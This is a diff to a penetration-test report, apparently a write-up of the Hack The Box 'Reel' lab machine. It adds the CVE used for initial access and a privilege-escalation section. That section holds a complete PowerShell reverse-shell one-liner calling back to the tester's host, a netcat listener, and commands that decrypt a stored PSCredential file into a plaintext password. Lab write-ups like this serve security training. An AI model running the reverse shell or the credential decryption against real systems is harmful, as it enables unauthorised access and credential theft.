@@ -25,7 +25,7 @@ I was tasked with performing an internal penetration test towards the client net
 
 When performing the internal penetration test, there were several alarming vulnerabilities that were identified on client's network. When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During the testing, I had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below:
 
-* 10.129.15.19 (Reel) - Name of initial exploit
+* 10.129.15.19 (Reel) - Microsoft Office/WordPad Remote Code Execution Vulnerability CVE-2017-0199
 
 ### Recommendations
 
@@ -501,7 +501,7 @@ C:\Windows\system32>
 
 **Local.txt Proof Screenshot**
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>user proof</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>user proof</p></figcaption></figure>
 
 **Local.txt Contents**
 
@@ -563,6 +563,82 @@ C:\Users\nico\Desktop>
 **Privilege Escalation**
 
 _Additional Priv Esc info_
+
+_Upgrading to powershell and catching the new shell_
+
+{% code overflow="wrap" %}
+```
+C:\Users\nico\Desktop>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',53);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',53);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+{% endcode %}
+
+```
+┌──[Tue Nov  8 06:34:32 PM CST 2022]-[TheScriptKid]-[/home/pentester]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: ]
+└──# nc -lnvp 53 
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::53
+Ncat: Listening on 0.0.0.0:53
+Ncat: Connection from 10.129.15.19.
+Ncat: Connection from 10.129.15.19:57585.
+```
+
+Listing the files in nico's desktop shows a file of interest
+
+```
+PS C:\Users\nico\Desktop> ls
+
+
+    Directory: C:\Users\nico\Desktop
+
+
+Mode                LastWriteTime     Length Name                                                                      
+----                -------------     ------ ----                                                                      
+-ar--        28/10/2017     00:59       1468 cred.xml                                                                  
+-ar--        28/10/2017     00:40         32 user.txt                                                                  
+
+
+PS C:\Users\nico\Desktop> cat cred.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">HTB\Tom</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+I proceed to uncover what appears to be a password string
+
+```
+PS C:\Users\nico\Desktop> $pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692' | convertto-securestring
+PS C:\Users\nico\Desktop> $user = 'HTB\tom'
+PS C:\Users\nico\Desktop> $cred = New-Object System.Management.Automation.PSCredential $user,$pass
+PS C:\Users\nico\Desktop> $cred.getnetworkcredential() | fl
+
+
+UserName       : tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+
+
+
+
+
+
+
+
+
+
 
 **Vulnerability Exploited:**
 
